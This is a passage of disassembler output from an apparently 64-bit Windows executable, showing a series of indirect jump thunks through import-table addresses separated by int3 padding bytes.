   140009cfa:	cc                   	int3
   140009cfb:	cc                   	int3
   140009cfc:	cc                   	int3
   140009cfd:	cc                   	int3
   140009cfe:	cc                   	int3
   140009cff:	cc                   	int3
   140009d00:	ff 25 52 1f 00 00    	jmp    *0x1f52(%rip)        # 0x14000bc58
   140009d06:	cc                   	int3
   140009d07:	cc                   	int3
   140009d08:	cc                   	int3
   140009d09:	cc                   	int3
   140009d0a:	cc                   	int3
   140009d0b:	cc                   	int3
   140009d0c:	cc                   	int3
   140009d0d:	cc                   	int3
   140009d0e:	cc                   	int3
   140009d0f:	cc                   	int3
   140009d10:	ff 25 da 1e 00 00    	jmp    *0x1eda(%rip)        # 0x14000bbf0
   140009d16:	cc                   	int3
   140009d17:	cc                   	int3
   140009d18:	cc                   	int3
   140009d19:	cc                   	int3
   140009d1a:	cc                   	int3
   140009d1b:	cc                   	int3
   140009d1c:	cc                   	int3
   140009d1d:	cc                   	int3
   140009d1e:	cc                   	int3
   140009d1f:	cc                   	int3
   140009d20:	ff 25 da 1e 00 00    	jmp    *0x1eda(%rip)        # 0x14000bc00
   140009d26:	cc                   	int3
   140009d27:	cc                   	int3
   140009d28:	cc                   	int3
   140009d29:	cc                   	int3
   140009d2a:	cc                   	int3
   140009d2b:	cc                   	int3
   140009d2c:	cc                   	int3
   140009d2d:	cc                   	int3
   140009d2e:	cc                   	int3
   140009d2f:	cc                   	int3
   140009d30:	ff 25 02 1f 00 00    	jmp    *0x1f02(%rip)        # 0x14000bc38
   140009d36:	cc                   	int3
   140009d37:	cc                   	int3
   140009d38:	cc                   	int3
   140009d39:	cc                   	int3
   140009d3a:	cc                   	int3
   140009d3b:	cc                   	int3
   140009d3c:	cc                   	int3
   140009d3d:	cc                   	int3
   140009d3e:	cc                   	int3
   140009d3f:	cc                   	int3
   140009d40:	ff 25 92 1e 00 00    	jmp    *0x1e92(%rip)        # 0x14000bbd8
   140009d46:	cc                   	int3
   140009d47:	cc                   	int3
   140009d48:	cc                   	int3
   140009d49:	cc                   	int3
   140009d4a:	cc                   	int3
   140009d4b:	cc                   	int3
   140009d4c:	cc                   	int3
   140009d4d:	cc                   	int3
   140009d4e:	cc                   	int3
   140009d4f:	cc                   	int3
   140009d50:	ff 25 3a 1e 00 00    	jmp    *0x1e3a(%rip)        # 0x14000bb90
   140009d56:	cc                   	int3
   140009d57:	cc                   	int3
   140009d58:	cc                   	int3
   140009d59:	cc                   	int3
   140009d5a:	cc                   	int3
   140009d5b:	cc                   	int3
   140009d5c:	cc                   	int3
   140009d5d:	cc                   	int3
   140009d5e:	cc                   	int3
   140009d5f:	cc                   	int3
   140009d60:	ff 25 ba 1e 00 00    	jmp    *0x1eba(%rip)        # 0x14000bc20
   140009d66:	cc                   	int3
   140009d67:	cc                   	int3
   140009d68:	cc                   	int3
   140009d69:	cc                   	int3
   140009d6a:	cc                   	int3
   140009d6b:	cc                   	int3
   140009d6c:	cc                   	int3
   140009d6d:	cc                   	int3
   140009d6e:	cc                   	int3
   140009d6f:	cc                   	int3
   140009d70:	ff 25 52 1e 00 00    	jmp    *0x1e52(%rip)        # 0x14000bbc8
   140009d76:	cc                   	int3
   140009d77:	cc                   	int3
   140009d78:	cc                   	int3
   140009d79:	cc                   	int3
   140009d7a:	cc                   	int3
   140009d7b:	cc                   	int3
   140009d7c:	cc                   	int3
   140009d7d:	cc                   	int3
   140009d7e:	cc                   	int3
   140009d7f:	cc                   	int3
   140009d80:	ff 25 4a 1e 00 00    	jmp    *0x1e4a(%rip)        # 0x14000bbd0
   140009d86:	cc                   	int3
   140009d87:	cc                   	int3
   140009d88:	cc                   	int3
   140009d89:	cc                   	int3
   140009d8a:	cc                   	int3
   140009d8b:	cc                   	int3
   140009d8c:	cc                   	int3
   140009d8d:	cc                   	int3
   140009d8e:	cc                   	int3
   140009d8f:	cc                   	int3
   140009d90:	ff 25 4a 1e 00 00    	jmp    *0x1e4a(%rip)        # 0x14000bbe0
   140009d96:	cc                   	int3
   140009d97:	cc                   	int3
   140009d98:	cc                   	int3
   140009d99:	cc                   	int3
   140009d9a:	cc                   	int3
   140009d9b:	cc                   	int3
   140009d9c:	cc                   	int3
   140009d9d:	cc                   	int3
   140009d9e:	cc                   	int3
   140009d9f:	cc                   	int3
   140009da0:	ff 25 52 1e 00 00    	jmp    *0x1e52(%rip)        # 0x14000bbf8
   140009da6:	cc                   	int3
   140009da7:	cc                   	int3
   140009da8:	cc                   	int3
   140009da9:	cc                   	int3
   140009daa:	cc                   	int3
   140009dab:	cc                   	int3
   140009dac:	cc                   	int3
   140009dad:	cc                   	int3
   140009dae:	cc                   	int3
   140009daf:	cc                   	int3
   140009db0:	ff 25 ca 1d 00 00    	jmp    *0x1dca(%rip)        # 0x14000bb80
   140009db6:	cc                   	int3
   140009db7:	cc                   	int3
   140009db8:	cc                   	int3
   140009db9:	cc                   	int3
   140009dba:	cc                   	int3
   140009dbb:	cc                   	int3
   140009dbc:	cc                   	int3
   140009dbd:	cc                   	int3
   140009dbe:	cc                   	int3
   140009dbf:	cc                   	int3
   140009dc0:	ff 25 6a 1e 00 00    	jmp    *0x1e6a(%rip)        # 0x14000bc30
   140009dc6:	cc                   	int3
   140009dc7:	cc                   	int3
   140009dc8:	cc                   	int3
   140009dc9:	cc                   	int3
   140009dca:	cc                   	int3
   140009dcb:	cc                   	int3
   140009dcc:	cc                   	int3
   140009dcd:	cc                   	int3
   140009dce:	cc                   	int3
   140009dcf:	cc                   	int3
   140009dd0:	ff 25 42 1e 00 00    	jmp    *0x1e42(%rip)        # 0x14000bc18
